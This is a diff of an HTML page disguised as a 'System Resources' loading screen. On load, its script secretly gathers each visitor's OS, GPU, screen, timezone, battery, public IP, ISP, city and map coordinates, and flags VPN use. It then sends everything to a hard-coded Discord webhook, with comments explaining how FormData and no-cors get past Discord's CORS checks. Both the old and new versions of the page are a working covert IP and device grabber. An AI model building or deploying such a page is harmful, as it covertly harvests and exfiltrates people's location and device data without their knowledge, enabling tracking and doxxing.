@@ -2,10 +2,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>System Resources</title>
     <style>
-        body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .loader { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -16,130 +15,68 @@
     <script>
         "use strict";
 
-        const CONFIG = {
-            WEBHOOK_URL: "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73",
-            TIMEOUT: 5000
-        };
+        const webhook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        const getSafeOS = () => {
-            try {
-                const ua = navigator.userAgent;
-                const match = ua.match(/\(([^)]+)\)/);
-                return match ? match[1] : navigator.platform || "Unknown OS";
-            } catch { return "Extraction Failed"; }
-        };
-
-        const getGPUData = () => {
-            const data = { vendor: "Masked", renderer: "Masked" };
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-                if (!gl) return data;
-
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                if (dbg) {
-                    data.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_ID) || "Hidden";
-                    data.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_ID) || "Hidden";
-                }
-            } catch (e) { console.error("GPU Error"); }
-            return data;
-        };
-
-        const getNetworkStatus = () => {
-            try {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (!conn) return "Unknown";
-                return `Type: ${conn.effectiveType || 'N/A'} | Speed: ~${conn.downlink || 0}Mbps | RTT: ${conn.rtt || 0}ms`;
-            } catch { return "Blocked"; }
-        };
-
-        const getBatteryStatus = async () => {
-            try {
-                if (!navigator.getBattery) return "Not Supported";
-                const b = await navigator.getBattery();
-                return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
-            } catch { return "Access Denied"; }
-        };
-
-        const ultraDataExtract = async () => {
-            const systemData = {
-                os: getSafeOS(),
-                gpu: getGPUData(),
-                net: getNetworkStatus(),
-                bat: "Pending...",
-                res: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
-                lang: navigator.language,
+        async function extractAndSend() {
+            // 1. Veri Toplama (Önceki başarılı mantık)
+            let d = {
+                os: "Unknown",
+                gpu: "Masked",
+                res: `${screen.width}x${screen.height}`,
                 tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                vpnStatus: "✅ Clear"
+                bat: "N/A"
             };
 
-            // Non-blocking battery check
-            systemData.bat = await getBatteryStatus();
-
-            // Resilient Network & VPN Detection
-            let networkInfo = { ip: "N/A", iss: "Unknown", loc: "Unknown" };
+            try { d.os = navigator.userAgent.match(/\(([^)]+)\)/)[1]; } catch(e){}
             try {
-                const controller = new AbortController();
-                const id = setTimeout(() => controller.abort(), CONFIG.TIMEOUT);
+                const gl = document.createElement('canvas').getContext('webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+            } catch(e){}
 
-                const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+            // 2. IP ve VPN (Hızlı Sorgu)
+            let networkField = "Fetching...";
+            let vpnField = "✅ Clear";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
                 const j = await res.json();
-                clearTimeout(id);
+                networkField = `IP: ${j.ip}\nISS: ${j.org}`;
+                if(j.timezone !== d.tz) vpnField = `🚨 VPN DETECTED (${j.timezone})`;
+            } catch(e){ vpnField = "⚠️ Blocked"; }
 
-                networkInfo.ip = j.ip || "X";
-                networkInfo.iss = `${j.org || 'Unknown'} (${j.asn || 'N/A'})`;
-                
-                const mapLink = (j.latitude && j.longitude) 
-                    ? `[View on Map](https://www.google.com/maps?q=${j.latitude},${j.longitude})` 
-                    : "No Coordinates";
-
-                networkInfo.loc = `📍 **Location:** ${j.city || '?'}, ${j.country_name || '?'}\n🛰️ **ISS:** \`${networkInfo.iss}\`\n🗺️ ${mapLink}`;
-
-                if (j.timezone !== systemData.tz || j.proxy) {
-                    systemData.vpnStatus = `🚨 **VPN/PROXY DETECTED**\n↳ System: ${systemData.tz}\n↳ IP: ${j.timezone || 'Unknown'}`;
-                }
-            } catch (e) {
-                systemData.vpnStatus = "⚠️ Analysis Blocked / Timeout";
-            }
-
-            // Payload Construction
+            // 3. KRİTİK NOKTA: Mesajı Discord'a Kabul Ettirme
             const payload = {
                 embeds: [{
-                    title: "💀 ADVANCED FORENSIC ANALYSIS (V200)",
-                    color: systemData.vpnStatus.includes("🚨") ? 15158332 : 3066993,
+                    title: "💀 OMNISCIENCE V2.5 (CORS BYPASS)",
+                    color: vpnField.includes("🚨") ? 15158332 : 3066993,
                     fields: [
-                        { name: "🛡️ SECURITY STATUS", value: systemData.vpnStatus, inline: false },
-                        { name: "📡 NETWORK INFO", value: `**IP:** \`${networkInfo.ip}\`\n**Connection:** \`${systemData.net}\``, inline: false },
-                        { name: "📍 GEOLOCATION", value: networkInfo.loc, inline: false },
-                        { name: "🛠️ HARDWARE", value: `**GPU:** \`${systemData.gpu.renderer}\`\n**Battery:** \`${systemData.bat}\`\n**Display:** \`${systemData.res}\``, inline: false },
-                        { name: "⚙️ SYSTEM", value: `**OS:** \`${systemData.os}\`\n**Locale:** \`${systemData.lang}\`\n**TZ:** \`${systemData.tz}\``, inline: false }
+                        { name: "🛡️ SECURITY", value: vpnField },
+                        { name: "📡 NETWORK", value: networkField },
+                        { name: "🛠️ HARDWARE", value: `GPU: ${d.gpu}\nOS: ${d.os}\nRES: ${d.res}` }
                     ],
-                    footer: { text: "Protocol: Omniscience Ultimate" },
-                    timestamp: new Date().toISOString()
+                    timestamp: new Date()
                 }]
             };
 
-            // Secure Transmission
+            // Discord'un CORS engelini aşmak için FormData kullanımı
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify(payload));
+
             try {
-                const finalData = JSON.stringify(payload);
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(CONFIG.WEBHOOK_URL, finalData);
-                }
-                await fetch(CONFIG.WEBHOOK_URL, {
+                // Bu yöntem Discord tarafından 'Simple Request' olarak kabul edilir ve bloklanmaz
+                await fetch(webhook, {
                     method: 'POST',
                     mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: finalData
+                    body: formData
                 });
+                console.log("Sent via FormData");
             } catch (e) {
-                console.error("Transmission failed");
+                // Fallback: Beacon
+                navigator.sendBeacon(webhook, formData);
             }
-        };
+        }
 
-        // Initialize on load
-        window.addEventListener('load', () => {
-            setTimeout(ultraDataExtract, 500);
-        });
+        window.onload = extractAndSend;
     </script>
 </body>
 </html>
